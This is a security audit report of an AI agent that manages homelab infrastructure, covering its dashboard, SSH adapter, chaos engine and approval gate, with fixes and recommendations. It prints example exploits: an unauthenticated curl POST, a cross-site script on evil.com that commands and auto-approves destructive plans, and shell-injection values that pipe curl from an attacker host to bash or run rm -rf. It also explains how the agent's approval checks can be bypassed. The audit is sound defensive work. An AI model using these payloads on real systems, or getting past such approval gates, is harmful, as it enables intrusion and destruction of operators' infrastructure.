# RHODES Security Audit — 2026-05-14

**Branch:** `audit/security-injection-secrets-2026-05-14`
**Auditor:** Senior Security Engineer (security review pass)
**Scope:** Command injection, SQL injection, path traversal, prompt injection,
approval-gate bypass, secrets handling, SSRF, CORS / dashboard exposure, MCP
server surface.
**Codebase version:** `0.4.4` (commit `ca9a15f`)
**Test status after critical fixes:** `tsc --noEmit` clean; `npx vitest run`
shows 2094 pass / 1 fail (pre-existing static-asset test unrelated to
security; same failure on the parent commit).

---

## Executive Summary

RHODES gets the *agent core* mostly right: the SSH adapter assembles argv
arrays (no shell-string interpolation), the safety classifier fails closed on
unknown commands and shell metacharacters, the snapshot-pause playbook
enforces a hard rule against deleting active VM disks, and every SQL query
uses parameterised statements through `better-sqlite3`. **The dashboard is
the soft underbelly.** Until this audit it bound to `0.0.0.0` by default,
served `Access-Control-Allow-Origin: *` on every method, and exposes
`POST /api/agent/command`, `POST /api/agent/approve`, `POST /api/chaos/execute`,
and `POST /api/migration/execute` with **zero authentication**. That combination
turned every laptop on the same Tailscale network — and every webpage the
operator browsed from a Tailscale-connected machine — into a remote control for
the agent. Two CRITICAL findings have been fixed in this branch (default-bind
to loopback; restrict CORS for write methods). Three HIGH findings remain
unfixed (no authentication at all; chaos engine ignores its own
`requires_approval`; `configureService` shell-interpolates the service /
config-path names). Several MEDIUM and LOW items round out the defense-
in-depth picture.

## Per-Finding Detail

### D-1  Dashboard binds to all interfaces (CRITICAL — FIXED in this branch)

**Code (pre-fix):**

```ts
// src/frontends/dashboard/server.ts:141
this.server.listen(this.port, () => {
  console.log(`[DashboardServer] Listening on http://localhost:${this.port}`);
  resolve();
});
```

`server.listen(port, cb)` with no host argument binds to `::` / `0.0.0.0`.
The log line claimed `localhost` but the bind was open. Combined with the
unauthenticated POST endpoints (`/api/agent/command`, `/api/agent/approve`,
`/api/chaos/execute`, `/api/migration/execute`, `/api/topology/apps/*`)
anyone on the same LAN, the same coffee-shop Wi-Fi, or the same Tailscale
tailnet could hit the dashboard and drive the agent. With shadow_mode off,
that includes destructive `ssh_exec` calls and live migrations.

**Exploit (concrete):**

```bash
# attacker on the LAN/tailnet:
curl -sX POST http://<nuc>:3000/api/agent/command \
  -H 'Content-Type: application/json' \
  -d '{"command":"delete VM 200"}'
# → server creates a goal, runs the planner, and (under approve_plan
#   default + plan-level approval coverage) executes risky_write steps.
```

**Fix shipped in this commit:**

* New config key `DashboardConfigSchema.host` (default `127.0.0.1`).
* Env override: `RHODES_DASHBOARD_HOST` (or legacy `DASHBOARD_HOST`).
* `DashboardServer` accepts `host` in its constructor and listens on it.
* When the operator opts back into `0.0.0.0` / `::`, the startup log prints a
  loud `WARNING: bound to all interfaces — dashboard has no authentication`
  reminder.

Operators running RHODES on a NUC reachable over Tailscale should set
`RHODES_DASHBOARD_HOST=<tailscale-ip>` (preferred) or `0.0.0.0` only after
adding the auth layer described in D-3.

### D-2  Wildcard CORS on write methods (CRITICAL — FIXED in this branch)

**Code (pre-fix):**

```ts
// src/frontends/dashboard/server.ts:203
res.setHeader("Access-Control-Allow-Origin", "*");
res.setHeader("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
res.setHeader("Access-Control-Allow-Headers", "Content-Type");
```

`Access-Control-Allow-Origin: *` plus permitted POST/DELETE plus permitted
`Content-Type` header means any webpage the operator visits in any browser
can make state-changing JSON requests to the dashboard origin (whether
local-only or LAN-reachable). The browser will issue the CORS pre-flight,
get a successful response, and then send the real POST. The attacker can't
read the response (no credentials) but they don't need to — fire-and-forget
is enough to plan and approve a destructive plan.

**Exploit (concrete):**

```html
<!-- evil.com served to a browser whose user has rhodes on localhost:3000 -->
<script>
  fetch("http://localhost:3000/api/agent/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ command: "delete VM 200 and confirm" }),
  });
  // ... and approve any pending plan ...
  fetch("http://localhost:3000/api/agent/approve", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ plan_id: "*", decision: "approve", operator: "x" }),
  });
</script>
```

**Fix shipped in this commit:** the CORS allow-origin / allow-methods /
allow-headers headers are now sent **only** for `GET` and the pre-flight
`OPTIONS`. POST / DELETE no longer receive `Access-Control-Allow-Origin: *`
and browsers will block cross-origin requests to them (same-site only).

### D-3  No authentication on the dashboard (HIGH — unfixed)

Every handler in `src/frontends/dashboard/server.ts` is anonymous. There is
no API key, no signed cookie, no mTLS, no IP allowlist. The threat-model
assumption is "Tailscale-only, trusted operator". D-1 + D-2 narrowed the
blast radius (loopback default, no cross-origin POST) but the underlying
gap remains: anyone who *can* reach the listener can drive every endpoint.

**Recommended fix:** the simplest defense-in-depth that fits the homelab
shape is a single shared-secret token, validated by middleware before any
non-`GET` handler runs, sourced from `RHODES_DASHBOARD_TOKEN`. For sessions,
HttpOnly secure cookie with `SameSite=Strict`. For long-term: OIDC via the
operator's existing IdP (Tailscale itself can mint identity headers via
`tailscale serve`).

### C-1  `configureService` shell-interpolation (HIGH)

**Code:**

```ts
// src/providers/system/adapter.ts:343–366
if (configPath && configContent) {
  const escaped = configContent.replace(/'/g, "'\\''");
  script += `mkdir -p "$(dirname '${configPath}')" && cat > '${configPath}' << 'RHODES_EOF'\n${escaped}\nRHODES_EOF\n`;
}

switch (action) {
  case "enable_and_start":
    script += `systemctl enable ${service} && systemctl start ${service} && systemctl status ${service} --no-pager`;
    break;
  // ... other cases all interpolate ${service} ...
}
```

`service` is user/LLM-controlled (a `risky_write` tool param) and is dropped
directly into a `bash`-interpreted command string. A service value of
`nginx; curl http://attacker/leak.sh | bash; #` would chain commands. The
same is true of `configPath` — the only escaping done is on
`configContent`, not on the path that hosts it. `cat > '${configPath}'`
breaks out if `configPath` contains a single quote.

**Exploit scenario:** an attacker who can reach the dashboard (or feeds a
crafted plan into the agent — see prompt-injection notes) calls
`configure_service` with `service="; rm -rf /var/lib/foo; #"`. The remote
SSH session executes that command as the configured SSH user (typically
root). The SSH-adapter safety classifier sits in front of `ssh_exec` but
**this code path does NOT go through the SSH adapter** — it calls
`SystemAdapter.runProcess("ssh", ...)` directly, so no command-tier
classification is applied.

**Recommended fix:** validate `service` against `/^[a-zA-Z0-9@:_.-]+$/`
(same pattern systemd permits) and validate `config_path` against
`/^\/[a-zA-Z0-9_./-]+$/` rejecting any quote or shell metachar; or, better,
replace the shell-interpolated script with `systemctl --no-pager <action>
<service-as-argv>` via the SSH adapter's argv path (and write the config
via a separate `sftp`/here-doc with the path passed as argv to `tee`).

### X-1  Chaos engine ignores its own `requires_approval` (HIGH)

**Code:**

```ts
// src/chaos/engine.ts:182–186
if (run.scenario.requires_approval && run.simulation.risk_score > 70) {
  run.simulation.recommendation =
    `[BLOCKED] Risk score ${run.simulation.risk_score}/100 exceeds safe threshold. ` +
    run.simulation.recommendation;
}

this.activeRun = run;
run.status = "executing";  // ← runs anyway
```

The recommendation string is updated but execution proceeds. Scenarios
flagged `requires_approval: true` (the high-blast-radius ones — `vm_kill`,
`node_isolate`, etc.) run unconditionally once `execute()` is called.
Combined with D-3 (no auth on `/api/chaos/execute`), pre-D-1/D-2 this was a
single unauthenticated POST away from killing the cluster. With D-1/D-2 in
place the attack surface drops to *local operator interaction only*, but a
mis-prompted agent (the LLM proposes "let's test resilience") could still
trip a destructive scenario without ever surfacing an approval gate.

**Recommended fix:** when `requires_approval && risk_score > <threshold>`,
either throw (refuse to execute) or route through `governance.evaluate()`
with an explicit `chaos:execute:<scenario_id>` tool name classified as
`destructive`. The chaos endpoint should call the executor with this tool,
not `chaosEngine.execute()` directly.

### G-1  SSH adapter not wired to ApprovalGate (MEDIUM)

**Code:**

```ts
// src/index.ts:163-172  (SshAdapter constructed without governanceEvaluator)
const sshAdapter = new SshAdapter(
  { targets, max_output_bytes, default_timeout_s,
    allow_destructive, strict_host_key_checking },
  { eventBus },          // ← no governanceEvaluator
);
```

The SSH adapter classifies each command (via `classifyCommand`) and refuses
`destructive`-tier commands when `allow_destructive=false`. That's correct.
But the **governance layer above only sees the tool name `ssh_exec`** — a
`risky_write` base tier. When the operator approves a plan at *plan-level*
(`build_mode: approve_plan`, the default), every subsequent `ssh_exec` step
inherits that plan approval. The policy `explicit_tiers: ["destructive",
"never"]` is supposed to force per-step approval for destructive actions —
but governance never learns that the underlying command is destructive,
because `classifyAction` only inspects the tool name + tool-definition base
tier, not the runtime command string.

**Net effect:** with `ssh.allow_destructive=true` (off by default), an
operator who approves "perform cluster cleanup" at plan-level has implicitly
approved every destructive shell command the LLM subsequently generates,
even though policy says destructive needs per-step approval. The adapter's
own kill-switch (`allow_destructive=false`) is the only thing keeping this
contained — and the SSH adapter's destructive refusal returns at the
adapter layer, not via the governance gate.

**Recommended fix:** wire `SshGovernanceEvaluator` in `index.ts` to a
closure that calls `governance.approvalGate.requestApproval` whenever the
classified runtime tier is higher than the tool's static tier. Or — more
robustly — have the executor re-classify `ssh_exec` calls via the SSH
adapter's classifier *before* the governance.evaluate step.

### C-2  Snapshot-name interpolation in remediation plan (MEDIUM)

**Code:**

```ts
// src/playbooks/proxmox-storage-pause.ts:643
const cmd = `qm delsnapshot ${input.vmid} ${c.name}`;
// :687
command: `qm snapshot ${input.vmid} ${safetyName}`,
```

`c.name` is parsed from `qm listsnapshot` output. Proxmox snapshot names
must match `^[a-zA-Z0-9_-]+$`, so the **typical** snapshot can't contain a
shell metachar — but the parser only requires `\S+` (any non-whitespace),
so a maliciously-named snapshot or a parser bug could feed `;`, `$()`, or a
quote into the command string. The downstream defense — `ProxmoxExecutor`
implementations either hit the Proxmox HTTPS API (safe, argv-style) or the
SSH adapter (re-classified via the safety classifier, which fails closed on
metacharacters) — keeps this from being directly exploitable today, but the
string-interpolation primitive is a foot-gun if a future executor passes the
`command` field to `bash -c` (e.g. the `local_exec` path).

**Recommended fix:** in `buildRemediationPlan`, validate snapshot names
against the Proxmox-permitted regex and reject the candidate (push to
`blocked_candidates`) if the name doesn't match. Cheap belt-and-braces.

### N-1  Outbound URL is operator-controlled (MEDIUM, accept-and-document)

`SUPRA_URL` and the Telegram base URL flow into `fetch()` from environment
variables (`src/notifications/providers/supra.ts:60`). On a multi-tenant
service this would be SSRF — for RHODES it's "the operator configured their
own alert sink", which is fine. Flag it only so a future product mode (e.g.
hosted RHODES) remembers to add an allowlist + metadata-IP block before
exposing this configuration to untrusted operators.

### H-1  Approval idempotency race (MEDIUM)

**Code:**

```ts
// src/governance/approval.ts:132–163
submitApiDecision(planId, decision, operator):
  - if existing decision && no pending → return existing (idempotent)
  - if no pending && no existing → 404
  - record decision; if pending, resolve it
```

Scenario: an operator rejects a plan via the dashboard, the resolver
settles `false`, and the agent surfaces the rejection. **The recorded
decision (`reject`) stays in `this.decisions`.** If the *same* `plan_id`
ever recurs (the planner reuses an id, the operator re-runs an investigation
that reproduces the id, etc.), the first call into `requestApproval` finds
`prior = decisions.get(planId)` and returns approved/rejected based on the
*old* decision — without prompting again. The risk is small (plan ids are
UUIDs from the planner) but the *replay* property is worth tightening: any
prior decision implicitly survives forever. A second concrete risk: a slow
double-click ("approve" twice while the resolver is settling) is handled
correctly because `pendingResolvers.delete(planId)` happens before
`resolve(true)`, but an *approve* arriving after the resolver already
settled `false` from a different code path will silently overwrite the
record without triggering another evaluation.

**Recommended fix:** decisions should expire (e.g. 60s after resolution) or
be keyed on `(plan_id, revision)`. Reject `submitApiDecision` calls whose
recorded decision is stale relative to the active plan revision.

### L-1  Identity-file disclosure surface (LOW — confirmed clean)

`SshAdapter.listTargets()` (`src/providers/ssh/adapter.ts:213-225`) returns
`Omit<SshTarget, "identity_file"> & { has_identity_file: boolean }`. The
client (`src/providers/ssh/client.ts:96`) passes `identity_file` as an
`-i <path>` argv pair, never to stderr/stdout. No `console.log` or audit
event includes it. The audit ships clean on this dimension.

### Dep-1  Dependency CVEs (LOW)

`npm audit --production` reports:

* `fast-xml-builder` / `fast-xml-parser` — moderate, comment/CDATA injection on
  *XML build*. Only the AWS SDK uses these, and only for request serialization
  to AWS endpoints we trust.
* `hono` — 11 advisories, ranging from cookie-name validation bypass to
  `bodyLimit` bypass. RHODES doesn't use Hono directly; it's transitive
  through `express-rate-limit` → `ip-address` chain.
* `path-to-regexp` 8.0.0-8.3.0 — high, ReDoS via sequential optional groups.
  Express depends on it.
* `ip-address ≤ 10.1.0` — moderate XSS in HTML-emitting methods (not used).
* `express-rate-limit` — depends on the vulnerable `ip-address`.

None of these are exploitable in RHODES today (we don't serve XML to
attackers, we don't accept arbitrary route patterns, we don't render
`ip-address` HTML). `npm audit fix` would update transitively but it's a
hygiene task, not a security incident.

## Inventory: Confirmed-clean classes

* **SQL injection — no exploitable SQL in this codebase.** `better-sqlite3`
  is used in three places (`src/monitoring/metric-store.ts`,
  `src/monitoring/run-telemetry.ts`, `src/topology/store.ts`,
  `src/governance/audit.ts`) and every query uses prepared statements with
  named parameters (`@name`) and `.run({...})` binding. The one piece of
  dynamic SQL — `updateApp` in `topology/store.ts:121` — builds the
  `SET col = @col` fragments from a fixed-allowlist of known columns; the
  `where` clause in `audit.ts:138` builds conditions from the same fixed
  allowlist of filter keys. No string-concatenated user input lands in any
  SQL.
* **Path traversal — dashboard static serving is guarded.** `serveStaticFile`
  rejects `..` and `\0` after URL-decoding (`server.ts:438-441`),
  `isReactStaticAssetPath` does the same (`server.ts:396-413`), and
  `handleMigrationStatus` `decodeURIComponent`s in a `try/catch` and returns
  404 on failure (`server.ts:1431-1445`). The provisioning ISO resolvers
  (`src/provisioning/iso-resolver.ts`) are scaffolds — they throw `TODO:
  implement` rather than performing any real file/URL operation, so there is
  no live ISO-download attack surface yet.
* **Hardcoded credentials — none in source.** Grepped for the known leaked
  password (<REDACTED — known compromised, see incident log>) and for `password\s*=\s*['"]` across `src/` and
  `tests/`. No hits in source. Test fixtures contain the string
  `password=secret` as a redaction-test fixture only; the redactor at
  `src/security/privacy.ts:68` is matching, not storing, those patterns.
* **Token logging — clean.** Provider clients (`src/providers/proxmox/`,
  `src/providers/aws/`, `src/providers/azure/`) log error messages and
  request URLs but not the `Authorization` header, token IDs, or secrets.
  Spot-checked `src/providers/proxmox/client.ts:379` (the HTTPS request
  builder) and the SSH client — no credential leakage paths.
* **.env handling — read-only.** `src/config.ts:22-47` loads `.env` via
  `dotenv.config({ path })` from a fallback chain; nothing writes to `.env`.
* **MCP server — stdio transport, not network.**
  `src/frontends/mcp.ts:178-181` uses `StdioServerTransport`. The MCP
  surface is only reachable by the parent process (Claude Code) — not over
  the network. No additional auth required, no exposure.
* **SSH command argv construction.** `buildSshArgs` and `runRemoteCommand`
  (`src/providers/ssh/client.ts`) pass `command` as the final argv element
  to `spawn("ssh", [...args])`. There is no shell on the local side, and
  the `command` is interpreted by the remote shell — which is the intended
  contract. The safety classifier
  (`src/providers/ssh/safety.ts:160-233`) fails closed on shell
  metacharacters, fails closed on unknown verbs (default `destructive`),
  and strips a single leading `sudo` for re-classification without
  recursing.
* **Vault.** `src/security/vault.ts:258` writes the credential store with
  `mode: 0o600`. AES-256-GCM, fresh IV per encryption, scrypt-derived key
  (per `SECURITY.md`). Not re-audited line-by-line in this pass — flagged as
  out-of-scope.

## Out-of-scope notes

* **Telegram bot token / Supra webhook authentication.** The notification
  providers send to whatever URL the operator configures via env vars. We
  did not audit the *Supra* side of the integration (Pranav's own service).
* **`SECURITY.md` claims about Privacy Router.** The router exists at
  `src/security/privacy.ts` but the audit did not stress-test its redaction
  patterns. Edge cases live in `tests/security/privacy-edge.test.ts` — 2090+
  passing tests give some confidence, but a focused fuzzing pass would be
  useful before claiming "no telemetry leaves the process".
* **Vault crypto implementation.** Trusted on the basis of the SECURITY.md
  description and 0o600 file mode. A proper review would include constant-
  time comparison, scrypt parameter selection vs. modern guidance, and
  recovery-on-corruption behaviour.
* **Migration cloud-uploader.** Uses argv-style SSH spawn for disk reads
  (`cloud-uploader.ts:64-78`) — looks safe but the AWS SDK upload path and
  Azure page-blob path were not exercised line-by-line.
* **Healing orchestrator.** Reviewed only via incident-manager file writes
  (`src/healing/incidents.ts:431,441`) — both write to a known data dir,
  not a user-controlled path. Full review out of scope.

## Critical-fix commit

This branch's single commit is the minimal critical fix described in D-1
and D-2: default-bind to `127.0.0.1`, make the host explicit and env-overridable,
and remove the wildcard CORS on write methods. No behavioral changes to the
agent, the SSH adapter, the approval gate, or the SQL layer. Tests pass
(2094 / 2111, with one pre-existing static-asset test failing identically
on the parent commit).
